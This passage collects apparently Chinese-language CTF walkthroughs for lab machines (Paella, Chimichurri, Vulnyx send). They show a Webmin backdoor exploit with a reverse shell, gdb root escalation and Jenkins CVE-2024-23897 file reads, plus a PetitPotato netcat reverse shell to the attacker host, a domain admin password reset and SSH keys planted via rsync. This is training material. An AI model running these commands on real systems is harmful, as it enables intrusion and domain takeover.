Payload options <span class="token punctuation">(</span>cmd/unix/reverse_perl<span class="token punctuation">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="token number">0</span>   Automatic <span class="token punctuation">(</span>Unix In-Memory<span class="token punctuation">)</span>



View the full module info with the info, or info <span class="token parameter variable">-d</span> command.

msf6 exploit<span class="token punctuation">(</span>linux/http/webmin_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.1.103
rhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.103
msf6 exploit<span class="token punctuation">(</span>linux/http/webmin_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.107
lhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.107
msf6 exploit<span class="token punctuation">(</span>linux/http/webmin_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.1.107:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target is vulnerable.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Configuring Automatic <span class="token punctuation">(</span>Unix In-Memory<span class="token punctuation">)</span> target
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending cmd/unix/reverse_perl <span class="token builtin class-name">command</span> payload
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command shell session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.1.107:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.1.103:36238<span class="token punctuation">)</span> at <span class="token number">2024</span>-07-30 <span class="token number">10</span>:28:31 +0800

<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>paella<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>paella<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>paella<span class="token punctuation">)</span></code></pre>
<p>直接拿到shell….</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">paella@TheHackersLabs-Paella:~$ <span class="token function">cat</span> user.txt
<span class="token function">cat</span> user.txt
05ac8932faf12b665a61a9037ec5acf9</code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传个linpeas跑一下<br><img src="https://ooo.0x0.ooo/2024/07/30/ORjQEa.png" alt="ORjQEa.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/07/30/ORjSuS.png" alt="ORjSuS.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">paella@TheHackersLabs-Paella:~$ /usr/bin/gdb <span class="token parameter variable">-nx</span> <span class="token parameter variable">-ex</span> <span class="token string">'python import os; os.setuid(0)'</span> <span class="token parameter variable">-ex</span> <span class="token string">'!sh'</span> <span class="token parameter variable">-ex</span> quit
<span class="token operator">&lt;</span><span class="token string">'python import os; os.setuid(0)'</span> <span class="token parameter variable">-ex</span> <span class="token string">'!sh'</span> <span class="token parameter variable">-ex</span> quit
GNU gdb <span class="token punctuation">(</span>Debian <span class="token number">8.2</span>.1-2+b3<span class="token punctuation">)</span> <span class="token number">8.2</span>.1
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2018</span> Free Software Foundation, Inc.
License GPLv3+: GNU GPL version <span class="token number">3</span> or later <span class="token operator">&lt;</span>http://gnu.org/licenses/gpl.html<span class="token operator">></span>
This is <span class="token function">free</span> software: you are <span class="token function">free</span> to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type <span class="token string">"show copying"</span> and <span class="token string">"show warranty"</span> <span class="token keyword">for</span> details.
This GDB was configured as <span class="token string">"x86_64-linux-gnu"</span><span class="token builtin class-name">.</span>
Type <span class="token string">"show configuration"</span> <span class="token keyword">for</span> configuration details.
For bug reporting instructions, please see:
<span class="token operator">&lt;</span>http://www.gnu.org/software/gdb/bugs/<span class="token operator">></span>.
Find the GDB manual and other documentation resources online at:
    <span class="token operator">&lt;</span>http://www.gnu.org/software/gdb/documentation/<span class="token operator">></span>.

For help, <span class="token builtin class-name">type</span> <span class="token string">"help"</span><span class="token builtin class-name">.</span>
Type <span class="token string">"apropos word"</span> to search <span class="token keyword">for</span> commands related to <span class="token string">"word"</span><span class="token builtin class-name">.</span>
<span class="token comment"># id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>paella<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>paella<span class="token punctuation">)</span></code></pre>
<p>结束</p>
]]></content>
      <categories>
        <category>thehackerlabs</category>
      </categories>
      <tags>
        <tag>webmin</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>thehackerslabs-Chimichurri</title>
    <url>/posts/2e40fc49/</url>
    <content><![CDATA[<p><strong>难度:PRINCIPIANTE</strong></p>
<p><strong>kali:192.168.200.3</strong></p>
<p><strong>靶机:192.168.200.4</strong><br><img src="https://ooo.0x0.ooo/2024/08/06/OtzK7s.png" alt="OtzK7s.png" loading="lazy"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://ooo.0x0.ooo/2024/08/06/Otzvua.png" alt="Otzvua.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token number">192.168</span>.200.4 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> -p53,88,135,139,389,445,464,593,636,3268,3269,6969,9389                                                                                                      <span class="token punctuation">[</span><span class="token number">23</span>:06:24<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-06 <span class="token number">23</span>:08 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.200.4
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00045s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE       VERSION
<span class="token number">53</span>/tcp   <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">88</span>/tcp   <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-08-06 <span class="token number">21</span>:08:26Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp  <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp  <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp  <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: chimichurri.thl, Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp <span class="token function">open</span>  tcpwrapped
<span class="token number">6969</span>/tcp <span class="token function">open</span>  http          Jetty <span class="token number">10.0</span>.11
<span class="token operator">|</span>_http-title: Panel de control <span class="token punctuation">[</span>Jenkins<span class="token punctuation">]</span>
<span class="token operator">|</span> http-robots.txt: <span class="token number">1</span> disallowed entry
<span class="token operator">|</span>_/
<span class="token operator">|</span>_http-server-header: Jetty<span class="token punctuation">(</span><span class="token number">10.0</span>.11<span class="token punctuation">)</span>
<span class="token number">9389</span>/tcp <span class="token function">open</span>  mc-nmf        .NET Message Framing
MAC Address: 08:00:27:88:AD:FC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Microsoft Windows <span class="token number">2016</span>
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server <span class="token number">2016</span> build <span class="token number">10586</span> - <span class="token number">14393</span>
Network Distance: <span class="token number">1</span> hop
Service Info: Host: CHIMICHURRI<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows</code></pre>
<p>看到域名<code>chimichurri.thl</code>，还有个web服务6969端口的。</p>
<h2 id="SMB枚举"><a href="#SMB枚举" class="headerlink" title="SMB枚举"></a>SMB枚举</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  enum4linux <span class="token parameter variable">-a</span> <span class="token number">192.168</span>.200.4                                                                                                                                                            <span class="token punctuation">[</span><span class="token number">23</span>:14:54<span class="token punctuation">]</span> Starting enum4linux v0.9.1 <span class="token punctuation">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="token punctuation">)</span> on Tue Aug  <span class="token number">6</span> <span class="token number">23</span>:15:16 <span class="token number">2024</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Target Information <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Target <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token number">192.168</span>.200.4
RID Range <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token number">500</span>-550,1000-1050
Username <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Password <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Known Usernames <span class="token punctuation">..</span> administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Enumerating Workgroup/Domain on <span class="token number">192.168</span>.200.4 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got domain/workgroup name: CHIMICHURRI0
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>没有收获<br><img src="https://ooo.0x0.ooo/2024/08/06/OtzgzS.png" alt="OtzgzS.png" loading="lazy"><br>匿名访问也没有<br>查看共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  smbclient --no-pass <span class="token parameter variable">-L</span> //chimichurri.thl                                                                                                                                               <span class="token punctuation">[</span><span class="token number">23</span>:18:58<span class="token punctuation">]</span>

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        drogas          Disk
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión
Reconnecting with SMB1 <span class="token keyword">for</span> workgroup listing.
do_connect: Connection to chimichurri.thl failed <span class="token punctuation">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="token punctuation">)</span></code></pre>
<p>有个drogas自定义共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  smbclient //chimichurri.thl/drogas --no-pass                                                                                                                                           <span class="token punctuation">[</span><span class="token number">23</span>:22:21<span class="token punctuation">]</span> Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Thu Jun <span class="token number">27</span> <span class="token number">18</span>:20:49 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Thu Jun <span class="token number">27</span> <span class="token number">18</span>:20:49 <span class="token number">2024</span>
  credenciales.txt                    A       <span class="token number">95</span>  Mon Jul  <span class="token number">1</span> 01:19:03 <span class="token number">2024</span>

  <span class="token number">7735807</span> blocks of size <span class="token number">4096</span>. <span class="token number">4231450</span> blocks available</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/06/OtzmPN.png" alt="OtzmPN.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/06/OtzPTL.png" alt="OtzPTL.png" loading="lazy"><br>不翻译成英文看不懂啊，在他的桌面上有个access key，应该叫parrot。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p><img src="https://ooo.0x0.ooo/2024/08/06/OtzRvi.png" alt="OtzRvi.png" loading="lazy"><br>是个jenkins的框架，还给了版本号<code>Jenkins 2.361.4</code>，搜一下漏洞。试了好几个，发现有个cve可用，并且是任意文件读取漏洞，可以尝试读取上面的桌面文件。<br>有个python版的exp<br><a href="https://github.com/godylockz/CVE-2024-23897/blob/main/jenkins_fileread.py">https://github.com/godylockz/CVE-2024-23897/blob/main/jenkins_fileread.py</a><br>根据提示，实在黑客桌面的parrot文件<br><img src="https://ooo.0x0.ooo/2024/08/06/OtzHNx.png" alt="OtzHNx.png" loading="lazy"><br>拿到黑客账号密码<code>hacker:Perico69</code></p>
<h2 id="winrm登录"><a href="#winrm登录" class="headerlink" title="winrm登录"></a>winrm登录</h2><p><img src="https://ooo.0x0.ooo/2024/08/07/OtzLLj.png" alt="OtzLLj.png" loading="lazy"><br>winrm登录发现桌面还有个user flag，但是没有权限读取。<br>那就在域内信息收集</p>
<h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p><img src="https://ooo.0x0.ooo/2024/08/07/OtzEup.png" alt="OtzEup.png" loading="lazy"><br>全是西班牙语看起来好难受，不过还是让我看到了这个权限<code>SeImpersonatePrivilege</code>,之前遇到过，允许模拟（但不能创建）任何令牌，可以通过引导 Windows服务(DCOM)针对漏洞执行NTLM身份验证来从Windows服务(DCOM)获取特权令牌，然后启用具有SYSTEM权限的进程的执行。<br>直接上GodPotato 土豆提取</p>
<h2 id="SeImpersonatePrivilege提权"><a href="#SeImpersonatePrivilege提权" class="headerlink" title="SeImpersonatePrivilege提权"></a>SeImpersonatePrivilege提权</h2><p><img src="https://ooo.0x0.ooo/2024/08/07/OtzQFU.png" alt="OtzQFU.png" loading="lazy"><br>应该是这个工具版本问题。<br>测试了几个土豆工具，都不好用，从别人wp那里学来一个新的工具<code>PetitPotato.exe</code><br><img src="https://ooo.0x0.ooo/2024/08/07/OtzSPY.png" alt="OtzSPY.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">./PetitPotato.exe <span class="token number">3</span> <span class="token string">"nc -t -e cmd.exe 192.168.200.3 4567"</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/07/Otz09v.png" alt="Otz09v.png" loading="lazy"><br>拿到system权限。<br><img src="https://ooo.0x0.ooo/2024/08/07/OtzdUq.png" alt="OtzdUq.png" loading="lazy"><br>修改一下域控的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token operator">></span>net user administrador passw0rd<span class="token operator">!</span>
net user administrador passw0rd<span class="token operator">!</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/08/07/Otzsvc.png" alt="Otzsvc.png" loading="lazy"><br>拿下域控。</p>
]]></content>
      <categories>
        <category>thehackerlabs</category>
      </categories>
      <tags>
        <tag>SeImpersonatePrivilege</tag>
        <tag>CVE-2024-23897</tag>
        <tag>PetitPotato</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnyx-send</title>
    <url>/posts/b53d3c5e/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.195</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>                 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:3d:d3:11       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.195  08:00:27:da:3d:65       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.930</span> seconds <span class="token punctuation">(</span><span class="token number">132.64</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.195
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-13 <span class="token number">17</span>:08 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.195
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0072s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT    STATE SERVICE
<span class="token number">22</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp  <span class="token function">open</span>  http
<span class="token number">873</span>/tcp <span class="token function">open</span>  <span class="token function">rsync</span>
MAC Address: 08:00:27:DA:3D:65 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.17</span> seconds</code></pre>
<h2 id="rsync远程连接"><a href="#rsync远程连接" class="headerlink" title="rsync远程连接"></a>rsync远程连接</h2><p>并不知道rsync服务是什么，经过搜索引擎知道<br><code>rsync</code>是一个强大且高效的文件同步和备份工具，用于在本地和远程系统之间同步文件和目录。rsync 支持增量传输、压缩传输和排除特定文件等功能。rsync 服务（通常通过 rsync 守护进程实现）可以使文件同步过程更加自动化和灵活。</p>
<p>通过描述可以猜测这个服务可以文件传输，查询一下连接这个服务的指令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">rsync</span> rsync://192.168.56.195                 

share           wally <span class="token punctuation">(</span>home<span class="token punctuation">)</span>
<span class="token operator">></span> <span class="token function">rsync</span> rsync://192.168.56.195/share/     

drwx------          <span class="token number">4,096</span> <span class="token number">2024</span>/07/13 <span class="token number">17</span>:11:09 <span class="token builtin class-name">.</span>
lrwxrwxrwx              <span class="token number">9</span> <span class="token number">2023</span>/04/23 <span class="token number">15</span>:34:26 .bash_history
-rw-------            <span class="token number">220</span> <span class="token number">2023</span>/01/15 <span class="token number">20</span>:58:06 .bash_logout
-rw-------          <span class="token number">3,526</span> <span class="token number">2023</span>/01/15 <span class="token number">20</span>:58:06 .bashrc
-rw-------            <span class="token number">807</span> <span class="token number">2023</span>/01/15 <span class="token number">20</span>:58:06 .profile
-r--------             <span class="token number">33</span> <span class="token number">2024</span>/07/11 <span class="token number">23</span>:34:21 user.txt
drwx------          <span class="token number">4,096</span> <span class="token number">2024</span>/07/13 <span class="token number">16</span>:32:43 .gnupg
drwxr-xr-x          <span class="token number">4,096</span> <span class="token number">2023</span>/04/29 <span class="token number">21</span>:50:29 .local</code></pre>

<p>拿到一个wally用户,先读一下flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">rsync</span> rsync://192.168.56.195/share/user.txt <span class="token builtin class-name">.</span>
<span class="token operator">></span> <span class="token function">cat</span> user.txt      
9e1d45e31***********8760d2108</code></pre>
<p>查了一下，还能写入文件，写个公钥进去</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> /tmp                                                                                                                                                                                                                                                                                                 root@kali2  <span class="token number">19</span>:42:32 
<span class="token operator">></span> <span class="token function">mkdir</span> .ssh

 /tmp                                                                                                                                                                                                                                                                                                 root@kali2  <span class="token number">19</span>:42:35 
<span class="token operator">></span> <span class="token function">cp</span> /root/.ssh/id_rsa .ssh/                     

 /tmp                                                                                                                                                                                                                                                                                                 root@kali2  <span class="token number">19</span>:42:56 
<span class="token operator">></span> <span class="token function">cp</span> /root/.ssh/id_rsa.pub .ssh/authorized_keys 

 /tmp                                                                                                                                                                                                                                                                                                 root@kali2  <span class="token number">19</span>:43:25 
<span class="token operator">></span> <span class="token function">rsync</span> <span class="token parameter variable">-avz</span> .ssh rsync://192.168.56.195/share/

sending incremental <span class="token function">file</span> list
.ssh/
.ssh/authorized_keys
.ssh/id_rsa

sent <span class="token number">2,929</span> bytes  received <span class="token number">58</span> bytes  <span class="token number">5,974</span>.00 bytes/sec
total size is <span class="token number">4,150</span>  speedup is <span class="token number">1.39</span>

 /tmp                                                                                                                                                                                                                                                                                                 root@kali2  <span class="token number">19</span>:43:52 
<span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa wally@192.168.56.195                         
Warning: Identity <span class="token function">file</span> id_rsa not accessible: No such <span class="token function">file</span> or directory.
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'/root/.ssh/id_rsa'</span><span class="token builtin class-name">:</span> 
wally@send:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>wally<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>wally<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>wally<span class="token punctuation">)</span></code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">wally@send:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>

We trust you have received the usual lecture from the <span class="token builtin class-name">local</span> System
Administrator. It usually boils down to these three things:

    <span class="token comment">#1) Respect the privacy of others.</span>
    <span class="token comment">#2) Think before you type.</span>
    <span class="token comment">#3) With great power comes great responsibility.</span>

<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> wally: 
sudo: a password is required</code></pre>
<p>没有<br>SUID</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">wally@send:~$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span>   <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper</code></pre>
<p>没有<br>传个pspy64分析一下<br>发现了一个定时任务<code>/usr/bin/apt-get update</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">12230</span>  <span class="token operator">|</span> /usr/bin/apt-get update 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">12227</span>  <span class="token operator">|</span> /usr/bin/apt-get update 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">12226</span>  <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-c</span> /usr/bin/apt-get update 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">12225</span>  <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">12</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">110</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">11</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">109</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">108</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">107</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">106</span>    <span class="token operator">|</span> 
